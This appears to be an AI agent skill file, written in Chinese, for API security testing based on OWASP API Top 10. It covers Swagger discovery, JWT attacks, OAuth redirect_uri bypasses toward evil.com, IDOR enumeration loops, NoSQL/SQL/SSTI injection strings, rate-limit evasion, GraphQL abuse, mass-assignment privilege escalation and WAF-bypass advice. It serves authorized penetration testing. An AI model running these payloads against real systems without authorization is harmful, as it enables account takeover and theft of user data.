---
name: api-security-testing
description: API安全测试 — 基于《Secure APIs》(Manning 2025)和OWASP API Top 10。覆盖Swagger发现、GraphQL攻击、REST漏洞、IDOR/BOLA、JWT攻击、API限流绕过。
user-invocable: true
---

# API Security Testing — API 安全测试

> 基于 José Haro Peralta《Secure APIs》(2025) + OWASP API Top 10

## 路由

| 任务 | 调用 |
|------|------|
| API 发现 | → §1 Discovery |
| 认证攻击 | → §2 Auth |
| 授权攻击 (IDOR) | → §3 IDOR |
| 注入攻击 | → §4 Injection |
| 限流绕过 | → §5 Rate Limit |
| GraphQL | → §6 GraphQL |
| Mass Assignment | → §7 Mass Assign |

---

## §1 API 发现

### 1.1 Swagger/OpenAPI 路径字典
```
/swagger.json     /swagger.yaml     /api-docs
/openapi.json     /openapi.yaml     /docs
/v2/swagger.json  /v3/api-docs      /swagger-resources
/swagger-ui.html  /redoc            /api/swagger.json
/doc.html         /knife4j          /swagger/index.html
```

### 1.2 自动发现
```bash
ffuf -u https://api.target.com/FUZZ \
  -w swagger_paths.txt -mc 200,301,302
# 下载并解析
curl -s https://api.target.com/swagger.json | jq '.paths | keys'
```

### 1.3 Google Dork
```
site:target.com intitle:"Swagger UI"
site:target.com intitle:"API Documentation"
site:target.com ext:json "swagger"
```

---

## §2 认证攻击

### 2.1 JWT 攻击清单
```
□ alg:none 攻击 (6种变体: none/None/NONE/nOnE/NoNe)
□ RS256→HS256 密钥混淆
□ 弱密钥爆破 (Top 15: secret/password/key/123456...)
□ kid 路径穿越 (../../etc/passwd)
□ kid SQL 注入
□ jwk 自签名注入
□ 空签名
□ 过期 token 重用
□ refresh token 无限刷新
```

### 2.2 JWT 检测
```bash
# 解码 JWT
jwt_tool.py <token> --exploit
# 弱密钥爆破
hashcat -m 16500 jwt.txt rockyou.txt
# 检测 none 算法
curl -H "Authorization: Bearer <altered>" https://api.target.com/user
```

### 2.3 API Key 模式
```
AWS:     AKIA + 16 chars
Google:  AIzaSy + 33 chars
Stripe:  sk_live_/sk_test_
GitHub:  ghp_ / gho_
OpenAI:  sk-
SendGrid: SG.
```

### 2.4 OAuth 2.0 redirect_uri 校验 (2026-08-01 实战新增)

oidc redirect_uri bypass 实战教训 — 遇到任何 OAuth/OIDC 端点,逐条测:

**□ startsWith() / substring 前缀绕过**
- 合法 redirect_uri = `https://app.target.com/callback`
- 绕过: `https://app.target.com/callback.evil.com`(前缀被点号跳过)
- 绕过: `https://app.target.com/callback@evil.com`(userinfo 分隔)
- 绕过: `https://app.target.com/callback/../evil`
- 绕过: `https://app.target.com/callback%2f%2fevil.com`(双重编码)
- 原理:用 `startsWith("https://app.target.com/callback")` 而非精确相等 / 精确解析

**□ .evil.com 后缀 & @evil.com userinfo 欺骗**
- 后缀: `https://app.target.com.evil.com` → 解析到 evil.com 域
- userinfo: `https://app.target.com@evil.com` → 认证部分交给 evil.com
- 危害:授权码 code 发给攻击控制的域 → 账号接管

**□ implicit flow (response_type=token) 接受性检查**
- 正常应用只应接受 `response_type=code`
- 若 `/authorize` 同时接受 `response_type=token` → access_token 直接出现在 URL fragment,经浏览器转发可窃取

**□ PKCE 强制执行检查**
- 不带 `code_challenge` 发起授权请求 → 仍正常返回 code? → PKCE 未强制
- PKCE 缺失 + redirect_uri 绕过 = 授权码截获链

**□ state 参数要求检查**
- 不带 `state` 发起 → 仍正常走流程? → 无 CSRF 防护
- state 缺失 / 可预测 → OAuth login CSRF / 会话固定

---

## §3 IDOR/BOLA 攻击

### 3.1 核心测试方法
```
1. 数字 ID 交换    /user/123 → /user/124
2. UUID 枚举       从邀请邮件泄露
3. 数组包裹         {"id":111} → {"id":[111]}
4. JSON 嵌套        {"id":{"id":111}}
5. 参数污染         ?user_id=legit&user_id=victim
6. 通配符           {"user_id":"*"}
7. HTTP 方法交换    PUT 有保护, DELETE 无
8. 旧 API 版本      /v1/ 无权限控制
```

### 3.2 影响分级
```
读 PII → Medium
写/修改他人数据 → High
管理员端点 → Critical
账号接管 → Critical
```

### 3.3 检测脚本
```bash
# 批量 ID 探测
for i in $(seq 1 100); do
  curl -s -o /dev/null -w "%{http_code}\n" \
    -H "Authorization: Bearer $TOKEN" \
    "https://api.target.com/user/$i/profile"
done
```

---

## §4 API 注入

### 4.1 NoSQL 注入
```json
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$regex": "admin.*"}, "password": {"$gt": ""}}
```

### 4.2 SQL 注入 (API 参数)
```bash
# JSON 中的 SQLi
curl -X POST -H "Content-Type: application/json" \
  -d '{"query":"SELECT * FROM users WHERE id='"'"'1'"'"' OR 1=1--"}' \
  https://api.target.com/search
```

### 4.3 SSTI (服务端模板注入)
```
{{7*7}}        → 49?    (Jinja2/Twig)
${7*7}         → 49?    (Freemarker)
{{=7*7}}       → 49?    (Django)
#{7*7}         → 49?    (Pug)
<%=7*7%>       → 49?    (ERB)
```

---

## §5 限流绕过

### 5.1 绕过手法
```
1. IP 轮换        X-Forwarded-For: <random>
2. 请求批处理      GraphQL batching
3. 空格变体        不同的空白字符
4. 参数顺序        改变 JSON key 顺序
5. User-Agent 轮换
6. 延迟请求        随机间隔
7. API 版本降级    /v2/ → /v1/
```

---

## §6 GraphQL 攻击

### 6.1 内省查询
```graphql
{ __schema { types { name fields { name type { name } } } } }
```
如果内省被禁，使用 `clairvoyance` 重建 schema。

### 6.2 攻击向量
```
□ Batching 爆破    一次请求含 20+ login mutation
□ Alias IDOR       { a:user(id:1){email} b:user(id:2){email} }
□ node() IDOR      { node(id:"base64id") { ...on User {email} } }
□ 深度递归 DoS      posts→comments→user→posts→...
□ 指令注入          @skip @include 绕过权限
```

### 6.3 工具
```
InQL (Burp)  |  GraphQLmap  |  graphql-cop
clairvoyance |  GraphCrawler |  graphw00f
```

---

## §7 Mass Assignment

### 7.1 检测
```json
# 正常请求
PUT /api/user/me {"name":"John"}
# 添加敏感字段
PUT /api/user/me {"name":"John","role":"admin","isAdmin":true}
# 嵌套对象
PUT /api/user/me {"name":"John","organization":{"id":1,"role":"admin"}}
```

### 7.2 常见敏感参数
```
role, isAdmin, isSuperuser, verified, activated
balance, credits, price, discount
organization_id, tenant_id, org_role
email_verified, phone_verified, approved
```

---

> **参考**: 《Secure APIs》(Manning 2025) + OWASP API Top 10 2025

---

## 2026-08-01 实战优化

今日教训固化:

1. **OAuth/OIDC 端点强制**:§2.4 redirect_uri 校验(前缀绕过 / @userinfo 欺骗 / 隐式流接受性 / PKCE 强制 / state 要求)逐条测完,再进攻击面。这是今天的 oidc redirect_uri bypass 实战结论。
2. **redirect_uri 判定标准**:不以 `startsWith()` 行为判定存在性,要以**能否让授权码 code 落到攻击可控域**作为成立标准。
3. **数据预筛联动**:提交前抽 3-5 条样本数据搜公网(参考记忆 `public-data-vs-vulnerability`),区分"服务你"vs"关于你"。
4. **WAF 联动**:若 API 前有 WAF,按 `web-app-security` §3(走私 / 竞态 / 缓存投毒)绕过再放弃。

> **参考**: 《Secure APIs》(Manning 2025) + OWASP API Top 10 2025
